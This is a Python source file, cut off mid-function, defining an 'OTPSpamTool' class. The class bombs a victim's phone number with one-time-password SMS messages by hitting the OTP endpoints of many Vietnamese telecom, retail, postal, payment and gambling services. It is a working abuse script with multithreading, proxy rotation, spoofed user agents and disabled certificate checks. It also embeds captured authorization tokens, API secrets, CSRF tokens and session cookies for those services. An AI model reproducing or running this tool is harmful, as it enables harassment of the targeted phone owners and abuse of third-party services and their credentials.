import requests
import time
from typing import Dict, List
import random
import string
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import os
import sys

# Config
MAX_THREADS = 50
TIMEOUT = 15
RETRY_ATTEMPTS = 3

class OTPSpamTool:
    def __init__(self):
        self.last_names = ['Nguyễn', 'Trần', 'Lê', 'Phạm', 'Võ', 'Hoàng', 'Bùi', 'Đặng']
        self.first_names = ['Nam', 'Tuấn', 'Hương', 'Linh', 'Long', 'Duy', 'Khôi', 'Anh', 'Trang', 'Huy']

        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Android 11; Mobile) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
        ]

        self.proxies = []
        self.use_proxy = True
        self.current_proxy_idx = 0
        self.results = {"success": 0, "failed": 0, "by_api": {}}
        self.lock = threading.Lock()
        
        self.load_proxies("proxy.txt")

    def get_proxy(self) -> Dict:
        if not self.use_proxy or not self.proxies:
            return {}

        with self.lock:
            proxy = self.proxies[self.current_proxy_idx % len(self.proxies)]
            self.current_proxy_idx += 1

        if "://" in proxy:
            return {
                "http": proxy,
                "https": proxy
            }
            
        return {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        }

    def generate_name(self) -> str:
        return f"{random.choice(self.last_names)} {random.choice(self.first_names)}"

    def update_result(self, api_name: str, status: bool):
        with self.lock:
            if status:
                self.results["success"] += 1
            else:
                self.results["failed"] += 1

            if api_name not in self.results["by_api"]:
                self.results["by_api"][api_name] = {"success": 0, "failed": 0}

            if status:
                self.results["by_api"][api_name]["success"] += 1
            else:
                self.results["by_api"][api_name]["failed"] += 1

    def create_session(self) -> requests.Session:
        session = requests.Session()
        retry = Retry(
            total=RETRY_ATTEMPTS,
            backoff_factor=0.3,
            status_forcelist=[429, 500, 502, 503, 504]
        )
        adapter = HTTPAdapter(max_retries=retry)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        return session

    def send_request(self, session: requests.Session, url: str, method: str = "POST", api_name: str = "", **kwargs) -> bool:
        try:
            headers = kwargs.get("headers", {})
            headers["User-Agent"] = self.get_random_ua()
            headers["Accept"] = "application/json"
            headers["Accept-Language"] = "vi-VN,vi;q=0.9"

            proxies = self.get_proxy()

            if method == "POST":
                response = session.post(
                    url, 
                    headers=headers, 
                    timeout=TIMEOUT,
                    proxies=proxies,
                    verify=False,
                    **{k: v for k, v in kwargs.items() if k != "headers"}
                )
            else:
                response = session.get(
                    url, 
                    headers=headers, 
                    timeout=TIMEOUT,
                    proxies=proxies,
                    verify=False,
                    **{k: v for k, v in kwargs.items() if k != "headers"}
                )

            success = response.status_code in [200, 201, 202, 400, 422, 429]
            self.update_result(api_name, success)
            return success
        except Exception as e:
            self.update_result(api_name, False)
            return False



    def load_proxies(self, proxy_file: str) -> bool:
        if not os.path.exists(proxy_file):
            print(f"❌ File proxy không tồn tại: {proxy_file}")
            return False

        try:
            with open(proxy_file, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]

            if not self.proxies:
                print("❌ File proxy trống!")
                return False

            print(f"✅ Đã load {len(self.proxies)} proxy")
            return True
        except Exception as e:
            print(f"❌ Lỗi load proxy: {e}")
            return False

    

    def send_vieon(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.vieon.vn/backend/user/v2/register",
            method="POST",
            headers={
                  'accept': 'application/json, text/plain, */*',
                  'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                  'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NDgyNzIwODUsImp0aSI6IjRlODY2ZjBjZGFjOWI3MmRmZTFkZTA2ZTVmMGM4Zjc2IiwiYXVkIjoiIiwiaWF0IjoxNzQ4MDk5Mjg1LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTc0ODA5OTI4NCwic3ViIjoiYW5vbnltb3VzXzdlY2Q5YzZhYjZiZDE2YmEzMGQ0ZWMxNzBiZWFmMzBjLWFkYWYwNjUwYTgwMzk3NmYzNTI2NWRhMTRmY2NiNDI2LTE3NDgwOTkyODUiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiN2VjZDljNmFiNmJkMTZiYTMwZDRlYzE3MGJlYWYzMGMtYWRhZjA2NTBhODAzOTc2ZjM1MjY1ZGExNGZjY2I0MjYtMTc0ODA5OTI4NSIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDYuMDsgTmV4dXMgNSBCdWlsZC9NUkE1OE4pIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzYuMC4wLjAgTW9iaWxlIFNhZmFyaS81MzcuMzYiLCJkdCI6IndlYiIsIm10aCI6ImFub255bW91c19sb2dpbiIsIm1kIjoiV2luZG93cyAxMCIsImlzcHJlIjowLCJ2ZXJzaW9uIjoiIn0.mRNkW9b_skkI6JYfCVAoj7B7LstyQ0E_0P4jnt5GY-8',
                  'content-type': 'application/json',
                  'origin': 'https://vieon.vn',
                  'priority': 'u=1, i',
                  'referer': 'https://vieon.vn/auth/?destination=/?srsltid=AfmBOopdZYv_U2sYd3ed1KkwGP_2i1nOGzd7ZAn7DaGrXaOWGtkLD3Zx&page=/',
                  'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
                  'sec-ch-ua-mobile': '?1',
                  'sec-ch-ua-platform': '"Android"',
                  'sec-fetch-dest': 'empty',
                  'sec-fetch-mode': 'cors',
                  'sec-fetch-site': 'same-site',
                  'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
                },
            json={
                  'username': sdt,
                },
            data={
                  'username': sdt,
                },
            params={
                  'platform': 'web',
                  'ui': '012021',
                },
            api_name="VIEON"
        )

    def send_best_inc(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://v9-cc.800best.com/uc/account/sendsignupcode",
            method="POST",
            headers={
                  'Host': 'v9-cc.800best.com',
                  'Connection': 'keep-alive',
                  # 'Content-Length': '53',
                  'x-timezone-offset': '7',
                  'x-auth-type': 'web-app',
                  'x-nat': 'vi-VN',
                  'x-lan': 'VI',
                  'authorization': 'null',
                  'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
                  'content-type': 'application/json',
                  'accept': 'application/json',
                  'lang-type': 'vi-VN',
                  'Origin': 'https://best-inc.vn',
                  'X-Requested-With': 'mark.via.gp',
                  'Sec-Fetch-Site': 'cross-site',
                  'Sec-Fetch-Mode': 'cors',
                  'Sec-Fetch-Dest': 'empty',
                  'Referer': 'https://best-inc.vn/',
                  'Accept-Encoding': 'gzip, deflate, br',
                  'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
                },
            data='{"phoneNumber":"sdt","verificationCodeType":1}'.replace("sdt", sdt),
            api_name="BEST_INC"
        )

    def send_pizzacompany(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://thepizzacompany.vn/customer/ResendOtp",
            method="POST",
            headers={
                  'Host': 'thepizzacompany.vn',
                  'accept': '*/*',
                  'x-requested-with': 'XMLHttpRequest',
                  'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
                  'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                  'origin': 'https://thepizzacompany.vn',
                  'sec-fetch-site': 'same-origin',
                  'sec-fetch-mode': 'cors',
                  'sec-fetch-dest': 'empty',
                  'referer': 'https://thepizzacompany.vn/Otp',
                  'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
                },
            cookies={
                  '_gcl_au': '1.1.607819339.1691276885',
                  '_ga': 'GA1.2.453948248.1691276886',
                  '_gid': 'GA1.2.698696022.1691276886',
                  '_tt_enable_cookie': '1',
                  '_ttp': 'bwCYo8Ir1_CxxhKbysJDt5JtlQ7',
                  '_fbp': 'fb.1.1691276888170.1960321660',
                  '.Nop.Antiforgery': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdBq9So1BpAShECqnbe4x79hVD-kSPUOvSsZXdlopovNftYPw0l618PP3jBxWlS6DrW8ZwRFgYyfMxRk4LVDYk1oqhci4h4z6nxsio4sRCpVfQ5PDeD_cOZBqbvNqQrfl8',
                  '.Nop.Customer': 'ccaefc12-aefb-4b4d-8b87-776f2ee9af1f',
                  '.Nop.TempData': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdhAs4Uj_AWcS9nus5bsNq7oJeUYXskCpd7NOOmUhHC6O5SoOmOuoB3SPldKVFXv1Vb_1P3Dt9jKaGFxsnoiu6YyCICvW4HiUNIz8FLPxXRz1gRZofRDec2--_PkEYAHM914UlVbGNyajdpimnWw70-wpCHoT5hmruwLhFMTe_qew',
                },
            data={
                  'phone': sdt,
                },
            api_name="PIZZACOMPANY"
        )

    def send_tv360(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "http://tv360.vn/public/v1/auth/get-otp-login",
            method="POST",
            headers={
                  'Accept': 'application/json, text/plain, */*',
                  'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                  'Connection': 'keep-alive',
                  'Content-Type': 'application/json',
                  'Origin': 'http://tv360.vn',
                  'Referer': 'http://tv360.vn/login?r=http%3A%2F%2Ftv360.vn%2F',
                  'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
                  'startTime': '1748148834187',
                  'tz': 'Asia/Saigon',
                },
            cookies={
                  'device-id': 's%3Awap_bd36142f-3f9e-48b7-8702-eaf24eee85b2.E7UHat%2BZVBxnrbp3QBamQj%2FOFe%2FIWM9r5jvcJXWNJTQ',
                  'shared-device-id': 'wap_bd36142f-3f9e-48b7-8702-eaf24eee85b2',
                  'screen-size': 's%3A958x1108.bDeJQcQtOt2QZaYNOtI7iRq2FRFZKUOf6pU9c22AnBc',
                  '_gid': 'GA1.2.2130656950.1748097972',
                  '_gcl_au': '1.1.212507564.1748097972',
                  'img-ext': 'avif',
                  '_gat_UA-180935206-1': '1',
                  '_ga': 'GA1.1.326740773.1748097972',
                  'G_ENABLED_IDPS': 'google',
                  '_ga_D7L53J0JMS': 'GS2.1.s1748148810$o2$g1$t1748148834$j36$l0$h0$d5NXBFeEoRqtVuyaiUato3GCbCX3_0VNyMw',
                  '_ga_E5YP28Y8EF': 'GS2.1.s1748148810$o2$g1$t1748148834$j0$l0$h0',
                },
            json={
                  'msisdn': sdt,
                },
            data={
                  'msisdn': sdt,
                },
            api_name="TV360"
        )

    def send_vtmoney(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api8.viettelpay.vn/customer/v2/accounts/register",
            method="POST",
            headers={
                  'host': 'api8.viettelpay.vn',
                  'content-type': 'application/json',
                  'accept': '*/*',
                  'app-version': '8.8.28',
                  'product': 'VIETTELPAY',
                  'type-os': 'ios',
                  'accept-encoding': 'gzip;q=1.0, compress;q=0.5',
                  'accept-language': 'vi',
                  'imei': '70B0EA3D-7FC0-45BA-8303-E83D802C004B',
                  'device-name': 'iPhone',
                  'user-agent': 'Viettel Money/8.8.28 (com.viettel.viettelpay; build:2; iOS 18.3.2) Alamofire/4.9.1',
                  'content-length': '73',
                  'os-version': '18.3.2',
                  #'cookie': '_cfuvid=IbrAhg9ruybk5tvcyo2YDibVieT0lAMzt5HRVyDkd8U-1748153577558-0.0.1.1-604800000',
                  'authority-party': 'APP',
                },
            cookies={
                  '_cfuvid': 'IbrAhg9ruybk5tvcyo2YDibVieT0lAMzt5HRVyDkd8U-1748153577558-0.0.1.1-604800000',
                },
            json={
                  "identityType": "msisdn",
                  "type": "REGISTER",
                  "identityValue": sdt,
                },
            data={
                  "identityType": "msisdn",
                  "type": "REGISTER",
                  "identityValue": sdt,
                },
            api_name="VTMONEY"
        )

    def send_vtpost(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://otp-verify.okd.viettelpost.vn/api/otp/sendOTP",
            method="POST",
            headers={
                  'host': 'otp-verify.okd.viettelpost.vn',
                  'accept': 'application/json, text/plain, */*',
                  'content-type': 'application/json;charset=utf-8',
                  'accept-encoding': 'gzip, deflate, br',
                  'user-agent': 'ViettelPost/2 CFNetwork/3826.400.120 Darwin/24.3.0',
                  'content-length': '84',
                  'accept-language': 'vi-VN,vi;q=0.9',
                },
            json={
                  "account": sdt,
                  "function": "SSO_REGISTER",
                  "type": "PHONE",
                  "otpType": "NUMBER",
                },
            data={
                  "account": sdt,
                  "function": "SSO_REGISTER",
                  "type": "PHONE",
                  "otpType": "NUMBER",
                },
            api_name="VTPOST"
        )

    def send_mobifone(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.mobifone.vn/api/auth/getloginotp",
            method="POST",
            headers={
                  'Host': 'api.mobifone.vn',
                  'uuid': 'E1EC4517-6B6B-4521-BFAF-9EFA9CE86422',
                  'Accept': '*/*',
                  'langcode': 'vi',
                  'timeStamp': '1748156139.314017',
                  'appversion': '4.17.4',
                  'Accept-Encoding':'br;q=1.0, gzip;q=0.9, deflate;q=0.8',
                  'Accept-Language': 'vi-VN;q=1.0',
                  'osinfo': 'iOS, 18.3.2',
                  'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
                  'deviceinfo': 'iPhone 11',
                  'User-Agent': 'MyMobiFone/4.17.4 (vms.com.MyMobifone; build:8; iOS 18.3.2) Alamofire/5.9.1',
                  'Content-Length': '15',
                  'Connection': 'keep-alive',
                  'apisecret': 'UEJ34gtH345DFG45G3ht1',
                },
            data={
                  'phone': sdt
                },
            api_name="MOBIFONE"
        )

    def send_myvnpt(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api-myvnpt.vnpt.vn/mapi_v2/services/otp_send",
            method="POST",
            headers={
                    'Host': 'api-myvnpt.vnpt.vn',
                    'Content-Type': 'application/json',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Language': 'vi_VN',
                    'User-Agent': 'My VNPT/5.1.5 (com.vnp.myvinaphone; build:2025051802; iOS 18.3.2) Alamofire/5.10.2',
                    'Accept-Language': 'vi-VN;q=1.0',
                    'Accept-Encoding': 'br;q=1.0, gzip;q=0.9, deflate;q=0.8',
                    'Device-Info': '6C043B99-B731-4EEC-82E3-04E3D708CC42|||iOS||5.1.5-2025051802|iPhone 11 18.3.2|',
                },
            json={
                    "otp_service": "authen_msisdn",
                    "msisdn": sdt,
                    "tinh_id": ""
                },
            data={
                    "otp_service": "authen_msisdn",
                    "msisdn": sdt,
                    "tinh_id": ""
                },
            api_name="MYVNPT"
        )

    def send_chotot(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://gateway.chotot.com/v2/public/auth/send_otp_verify",
            method="POST",
            headers={
                  'host': 'gateway.chotot.com',
                  'content-type': 'application/json',
                  'fingerprint': '3855FD92-0C1D-4CD9-98D6-7FEED088CC41',
                  'accept': '*/*',
                  'ct-fingerprint': '3855FD92-0C1D-4CD9-98D6-7FEED088CC41',
                  'ct-platform': 'ios',
                  'accept-language': 'vi-VN;q=1.0',
                  'accept-encoding': 'br;q=1.0, gzip;q=0.9, deflate;q=0.8',
                  'ct-idfp': 'ea26825a-e91d-5a1d-a29b-c2ea6c40151e',
                  'ct-app-version': '4.84.0',
                  'user-agent': 'ChoTot/4.84.0 (vn.chotot.iosapp; build:2505211426; iOS 18.3.2) Alamofire/5.9.1',
                  'content-length': '37',
                },
            cookies={
                  '_cfuvid':'QPSbcekUnptfoxekeMrE.8_QqQpa6TY6.bC.PwL.WFI-1748261723349-0.0.1.1-604800000',
                },
            json={
                  "phone": sdt,
                  "app_id":"ios"
                },
            data={
                  "phone": sdt,
                  "app_id":"ios"
                },
            api_name="CHOTOT"
        )

    def send_bhx(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://apibhx.tgdd.vn/User/LoginByNumberPhone",
            method="POST",
            headers={
                  'host': 'apibhx.tgdd.vn',
                  'content-type': 'application/json',
                  'reversehost': 'http://bhxapi.live',
                  'accept': 'application/json',
                  'authorization': 'Bearer E976DCB40A1EBFC9BF8597D8D35951D9',
                  'appscreen': 'Profile',
                  'accept-language': 'vi-VN,vi;q=0.9',
                  'accept-encoding': 'gzip, deflate, br',
                  'platform': 'ios',
                  'deviceid': '9FFC85BF-9173-4C97-837E-B7684816D992',
                  'content-length': '141',
                  'user-agent': 'iOS||18.3.2||9FFC85BF-9173-4C97-837E-B7684816D992||VersionApp 2.0.18', 
                  'xapikey': 'bhx-api-core-2022',
                },
            json={
                  "UserName":sdt,
                  "DeviceId":"9FFC85BF-9173-4C97-837E-B7684816D992",
                  "OS":"ios","Relogin":False,
                  "DeviceName":"iPhone 11",
                  "isOnlySMS":0
                },
            data={
                  "UserName":sdt,
                  "DeviceId":"9FFC85BF-9173-4C97-837E-B7684816D992",
                  "OS":"ios","Relogin":False,
                  "DeviceName":"iPhone 11",
                  "isOnlySMS":0
                },
            api_name="BHX"
        )

    def send_viettel(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://viettel.vn/api/getOTPLoginCommon",
            method="POST",
            headers={
                  'accept': 'application/json, text/plain, */*',
                  'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                  'content-type': 'application/json;charset=UTF-8',
                  'origin': 'https://viettel.vn',
                  'priority': 'u=1, i',
                  'referer': 'https://viettel.vn/myviettel',
                  'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
                  'sec-ch-ua-mobile': '?1',
                  'sec-ch-ua-platform': '"Android"',
                  'sec-fetch-dest': 'empty',
                  'sec-fetch-mode': 'cors',
                  'sec-fetch-site': 'same-origin',
                  'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
                  'x-csrf-token': 'pWLE6D0MSH5thBkXsqgrMS1syICTiEMVe15d5b8U',
                  'x-requested-with': 'XMLHttpRequest',
                  'x-xsrf-token': 'eyJpdiI6IjkxVmltU0xWcGVzV0JkaTlQN0tjYXc9PSIsInZhbHVlIjoiemhPYzVvVWZjaTdpQTlTOXZMenFkUkVCb0hvM3NZSnNZRGpldTNBbUJqbEF4OEkxMjVmelhmaUN4Y2pnQWEwOSIsIm1hYyI6IjRmYzhiOTM5MWE3OGQ4MjBmODlmY2ZjOGI3ODQ4MzJjODBkMWI5ZDNjMDM3M2NlZGE1NTc1N2IzNmQ2MGZiNWUifQ==',
                },
            cookies={
                  'D1N': '7b9e17f12dca137f1a880e2af6cd3eef',
                  '_gcl_au': '1.1.208220017.1748150523',
                  '_fbp': 'fb.1.1748150523616.32532520975271478',
                  'laravel_session': 'RUF81Shw8kXT6OaPXetZf6ehCU5sHs4BfgMvtbSO',
                  '_ga': 'GA1.2.621948631.1748150523',
                  '_gid': 'GA1.2.2110971541.1748270629',
                  'redirectLogin': 'https://viettel.vn/myviettel',
                  '__zi': '3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1ealoR7ennq1nchDikt86ql0QypswiSUGCDgplVl.1',
                  '_ga_Z30HDXVFSV': 'GS2.1.s1748270629$o2$g1$t1748270651$j0$l0$h0',
                  'XSRF-TOKEN': 'eyJpdiI6IjkxVmltU0xWcGVzV0JkaTlQN0tjYXc9PSIsInZhbHVlIjoiemhPYzVvVWZjaTdpQTlTOXZMenFkUkVCb0hvM3NZSnNZRGpldTNBbUJqbEF4OEkxMjVmelhmaUN4Y2pnQWEwOSIsIm1hYyI6IjRmYzhiOTM5MWE3OGQ4MjBmODlmY2ZjOGI3ODQ4MzJjODBkMWI5ZDNjMDM3M2NlZGE1NTc1N2IzNmQ2MGZiNWUifQ%3D%3D',
                  '_ga_VH8261689Q': 'GS2.1.s1748270629$o2$g1$t1748270976$j6$l0$h0$d0Vv7D8zlRK8nnDS-8CuV40LhSOaocF89YQ',
                },
            json={
                  'phone': sdt,
                  'typeCode': 'DI_DONG',
                  'actionCode': 'myviettel://login_mobile',
                  'type': 'otp_login',
                },
            data={
                  'phone': sdt,
                  'typeCode': 'DI_DONG',
                  'actionCode': 'myviettel://login_mobile',
                  'type': 'otp_login',
                },
            api_name="VIETTEL"
        )

    def send_sunwin(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.azhkthg1.net/paygate",
            method="GET",
            headers={
                  'accept': '*/*',
                  'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                  'authorization': '85d840e433c74f39a3d50d0f3e66cba9',
                  'origin': 'https://play.sun.win',
                  'priority': 'u=1, i',
                  'referer': 'https://play.sun.win/',
                  'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
                  'sec-ch-ua-mobile': '?1',
                  'sec-ch-ua-platform': '"Android"',
                  'sec-fetch-dest': 'empty',
                  'sec-fetch-mode': 'cors',
                  'sec-fetch-site': 'cross-site',
                  'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
                },
            params={
                  'command': 'getOTPCode',
                  'type': '1',
                  'phone': sdt,
                },
            api_name="SUNWIN"
        )

    def send_hitclb(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://pmbodergw.dsrcgoms.net/otp/send",
            method="POST",
            headers={
                  'accept': '*/*',
                  'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                  'content-type': 'application/json',
                  'origin': 'https://i.hit.club',
                  'priority': 'u=1, i',
                  'referer': 'https://i.hit.club/',
                  'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
                  'sec-ch-ua-mobile': '?1',
                  'sec-ch-ua-platform': '"Android"',
                  'sec-fetch-dest': 'empty',
                  'sec-fetch-mode': 'cors',
                  'sec-fetch-site': 'cross-site',
                  'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
                  'x-token': 'f4666827199d7dca78ca9be8dea3504d',
                },
            json={
                  'phone': sdt,
                  'app_id': 'bc114103',
                  'fg_id': '146fca9965e795f8f787485ecca8c61d',
                },
            data={
                  'phone': sdt,
                  'app_id': 'bc114103',
                  'fg_id': '146fca9965e795f8f787485ecca8c61d',
                },
            api_name="HITCLB"
        )

    def send_go88(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://pmbodergw.dsrcgoms.net/otp/send",
            method="POST",
            headers={
                  'accept': '*/*',
                  'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                  'content-type': 'application/json',
                  'origin': 'https://i.go88.com',
                  'priority': 'u=1, i',
                  'referer': 'https://i.go88.com/',
                  'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
                  'sec-ch-ua-mobile': '?1',
                  'sec-ch-ua-platform': '"Android"',
                  'sec-fetch-dest': 'empty',
                  'sec-fetch-mode': 'cors',
                  'sec-fetch-site': 'cross-site',
                  'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
                  'x-token': '68f6acc91fc4944effaee89430dd7a52',
                },
            json={
                  'phone': sdt,
                  'app_id': 'go88com',
                  'fg_id': 'bf43cf47709fc3c1357f915505275a50',
                },
            data={
                  'phone': sdt,
                  'app_id': 'go88com',
                  'fg_id': 'bf43cf47709fc3c1357f915505275a50',
                },
            api_name="GO88"
        )

    def send_gemwwin(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.gmwin.io/paygate",
            method="GET",
            headers={
                  'accept': '*/*',
                  'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                  'authorization': 'c61277d65f594e3b8a07a59d090c1197',
                  'origin': 'https://play.gem.win',
                  'priority': 'u=1, i',
                  'referer': 'https://play.gem.win/',
                  'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
                  'sec-ch-ua-mobile': '?1',
                  'sec-ch-ua-platform': '"Android"',
                  'sec-fetch-dest': 'empty',
                  'sec-fetch-mode': 'cors',
                  'sec-fetch-site': 'cross-site',
                  'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
                },
            params={
                  'command': 'getOTPCode',
                  'type': '1',
                  'phone': sdt,
                },
            api_name="GEMWWIN"
        )

    def send_b52(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://bfivegwpeymint.gwtenkges.com/otp/send",
            method="POST",
            headers={
                  'accept': '*/*',
                  'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                  'content-type': 'application/json',
                  'origin': 'https://play.b52.cc',
                  'priority': 'u=1, i',
                  'referer': 'https://play.b52.cc/',
                  'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
                  'sec-ch-ua-mobile': '?1',
                  'sec-ch-ua-platform': '"Android"',
                  'sec-fetch-dest': 'empty',
                  'sec-fetch-mode': 'cors',
                  'sec-fetch-site': 'cross-site',
                  'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
                  'x-token': 'dd01a21c9a0efde25c1b501ee6199c08',
                },
            json={
                  'phone': sdt,
                  'app_id': 'b52.club',
                  'fg_id': '146fca9965e795f8f787485ecca8c61d',
                },
            data={
                  'phone': sdt,
                  'app_id': 'b52.club',
                  'fg_id': '146fca9965e795f8f787485ecca8c61d',
                },
            api_name="B52"
        )

    def send_yo88(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://pmbodergw.dsrcgoms.net/otp/send",
            method="POST",
            headers={
                  'accept': '*/*',
                  'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                  'content-type': 'application/json',
                  'origin': 'https://web.yo88.tv',
                  'priority': 'u=1, i',
                  'referer': 'https://web.yo88.tv/',
                  'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
                  'sec-ch-ua-mobile': '?1',
                  'sec-ch-ua-platform': '"Android"',
                  'sec-fetch-dest': 'empty',
                  'sec-fetch-mode': 'cors',
                  'sec-fetch-site': 'cross-site',
                  'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
                  'x-token': '833b77d3e3bd5caf6a6d7943c7b4015c',
                },
            json={
                  'phone': sdt,
                  'app_id': 'yo88win',
                  'fg_id': '146fca9965e795f8f787485ecca8c61d',
                },
            data={
                  'phone': sdt,
                  'app_id': 'yo88win',
                  'fg_id': '146fca9965e795f8f787485ecca8c61d',
                },
            api_name="YO88"
        )

    def send_zowin(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.azhkthg1.net/paygate",
            method="GET",
            headers={
                  'accept': '*/*',
                  'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                  'authorization': '8f5e9746a22a4d2c9c6d945539ba564b',
                  'origin': 'https://i.zo10.win',
                  'priority': 'u=1, i',
                  'referer': 'https://i.zo10.win/',
                  'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
                  'sec-ch-ua-mobile': '?1',
                  'sec-ch-ua-platform': '"Android"',
                  'sec-fetch-dest': 'empty',
                  'sec-fetch-mode': 'cors',
                  'sec-fetch-site': 'cross-site',
                  'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
                },
            params={
                  'command': 'getOTPCode',
                  'type': '1',
                  'phone': sdt,
                },
            api_name="ZOWIN"
        )

    def send_fptshop(self, session, sdt: str) -> bool:
        return self.send_request(
